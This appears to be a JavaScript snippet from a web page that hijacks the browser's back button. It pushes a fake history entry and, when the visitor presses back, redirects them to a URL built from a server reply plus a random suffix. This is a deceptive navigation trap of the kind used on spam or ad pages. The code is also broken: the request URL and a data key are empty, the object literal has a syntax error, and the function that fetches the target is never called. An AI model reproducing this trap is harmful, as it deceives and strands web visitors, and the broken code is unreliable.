var jump_link="";
function back(){
    $.ajax({
        async:false,
        url: "http://",
        type: "get",
        dataType: "json",
        data:{
          "":
          "tm":new Date().getTime();
        },
        success: function (json) {
           if(json.res!=0){
        	   jump_link = json.obj + "/nullxh"+getRandomStr(5);
           }
        }
    });
}

function setHistory(backurl) {
    window.addEventListener('load', function() {
        setTimeout(function() {
            window.addEventListener('popstate', function() {
                window.location.replace(backurl);
            });
        }, 500);
    });
    function pushHistory() {
        var state = {
            title: "title",
            url: "#"
        };
        window.history.pushState(state, "title", "#");
    }
    pushHistory();
}

function getRandomStr(len) {
  var rdmString = "";
  for (; rdmString.length < len; rdmString += Math.random().toString(36).substr(2));
  return rdmString.substr(0, len);
}

 setHistory(jump_link);